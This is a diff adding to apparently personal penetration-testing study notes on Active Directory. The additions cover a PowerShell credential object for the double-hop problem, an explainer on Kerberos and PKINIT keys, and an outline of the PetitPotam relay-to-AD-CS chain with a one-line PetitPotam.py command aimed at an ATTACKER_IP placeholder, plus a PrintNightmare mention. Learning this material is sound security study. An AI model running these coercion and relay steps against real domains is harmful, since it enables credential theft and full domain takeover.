@@ -148,6 +148,13 @@ Exit-PSSession #=> exit
 evil-winrm -i 10.129.201.234 -u forend
 ```
 
+```bash
+#1: PSCredential Object duble houp problem
+$SecPassword = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
+$Cred = New-Object System.Management.Automation.PSCredential('<DOMAIN>\<USER>', $SecPassword)
+get-domainuser -spn -credential $Cred 
+```
+
 ## SQL Server Admin
 we will encounter SQL servers in the environments we face. It is common ==to find user and service accounts set up with sysadmin privileges on a given SQL server instance.==
 
@@ -395,6 +402,135 @@ C:\Windows\system32>whoami
 PetitPotam ([CVE-2021-36942](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-36942)) is an LSA spoofing vulnerability that was patched in August of 2021. The flaw allows an unauthenticated attacker to coerce a Domain Controller to authenticate against another host using NTLM over port 445 via the [Local Security Authority Remote Protocol (LSARPC)](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-lsad/1b5471ef-4c33-4a91-b079-dfcbb82f05cc) by abusing Microsoft’s [Encrypting File System Remote Protocol (MS-EFSRPC)](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/08796ba8-01c8-4872-9221-1000ec2eff31). This technique allows an unauthenticated attacker to take over a Windows domain where [Active Directory Certificate Services (AD CS)](https://docs.microsoft.com/en-us/learn/modules/implement-manage-active-directory-certificate-services/2-explore-fundamentals-of-pki-ad-cs) is in use. In the attack, an authentication request from the targeted Domain Controller is relayed to the Certificate Authority (CA) host's Web Enrollment page and makes a Certificate Signing Request (CSR) for a new digital certificate. This certificate can then be used with a tool such as `Rubeus` or `gettgtpkinit.py` from [PKINITtools](https://github.com/dirkjanm/PKINITtools) to request a TGT for the Domain Controller, which can then be used to achieve domain compromise via a DCSync attack.
 
 [This](https://dirkjanm.io/ntlm-relaying-to-ad-certificate-services/) blog post goes into more detail on NTLM relaying to AD CS and the PetitPotam attack.
+```bash
+==============================
+KERBEROS + PKINIT (CLEAR NAMES)
+==============================
+
+[1] KEYS (OFFICIAL + CONSISTENT)
+--------------------------------
+
+1. Long-term key (Kerberos official)
+   = derived from password (NT hash / AES key)
+   = used in Kerberos
+
+   👉 ALSO CALLED IN ATTACKS:
+      "AS-REP key"
+
+   ✔️ SAME THING:
+      Long-term key = AS-REP key
+
+
+2. KDC key (krbtgt key)
+   = secret of domain controller
+   = encrypts TGT
+
+
+3. Private key (certificate)
+   = comes from certificate (PKINIT)
+   = NOT related to password
+   = used only for certificate authentication
+
+
+⚠️ IMPORTANT:
+- Long-term key (AS-REP key) ≠ Private key
+- They are DIFFERENT
+
+
+[2] ANSWER YOUR QUESTIONS
+------------------------
+
+Q1: Encrypt_with(UserKey) → is this AS-REP key?
+✔️ YES
+
+Better name:
+  Encrypt_with(Long-term key)  (= AS-REP key)
+
+- Private key = from certificate
+- AS-REP key = from password
+
+👉 totally different
+
+
+[3] NORMAL KERBEROS FLOW
+------------------------
+
+AS-REQ:
+  user → KDC :
+    timestamp encrypted with Long-term key (AS-REP key)
+
+AS-REP:
+  KDC → user :
+    Encrypt_with(Long-term key) {
+        SessionKey
+        TGT
+    }
+
+    TGT = Encrypt_with(KDC key)
+
+
+[4] PKINIT (CERT AUTH)
+----------------------
+
+Instead of:
+  using Long-term key (password)
+
+We use:
+  Certificate + Private key
+
+Flow:
+  client proves identity using Private key
+  KDC verifies certificate
+  KDC sends AS-REP (same as normal)
+
+IMPORTANT:
+- KDC still uses Long-term key internally
+- Cert only replaces password check
+
+
+[5] SIMPLE COMPARISON
+---------------------
+
+PASSWORD AUTH:
+  password → Long-term key (AS-REP key) → login
+
+CERT AUTH:
+  private key (cert) → login
+
+BUT:
+  Long-term key STILL EXISTS in account
+
+
+[6] ATTACK (PETITPOTAM)
+-----------------------
+
+1. Force DC auth
+2. Relay to AD CS
+3. Get:
+   - Certificate (with Private key)
+   - sometimes Long-term key (AS-REP key)
+
+4. Use certificate:
+   → request TGT as DC
+
+5. Use access:
+   → DCSync
+
+
+[7] FINAL SUMMARY
+----------------
+
+Long-term key = AS-REP key = password-derived key
+
+Private key (certificate) ≠ Long-term key
+
+KDC key = encrypts TGT
+
+Attack:
+cert (private key) → TGT → full domain
+==============================
+```
+
 
 - **PKINIT** = Public Key Cryptography for Initial Authentication
 - **AS-REP** = Authentication Server Reply
@@ -413,6 +549,7 @@ AS-REP key lets you later decrypt PAC (e.g. with getnthash.py)
 > **PetitPotam** → MS-EFSRPC | no auth needed  
 > `python3 PetitPotam.py <ATTACKER_IP> <DC_IP>`
 > **Both** → force DC auth → attacker → relay NTLM → AD CS → cert → TGT → DCSync
+> **PrintNightmare** -> (CVE-2021-34527 and CVE-2021-1675) found in the Print Spooler service  laid to executing a shared file on the attack host
 
 
 ### Enum  Certification Authority servers and Templates
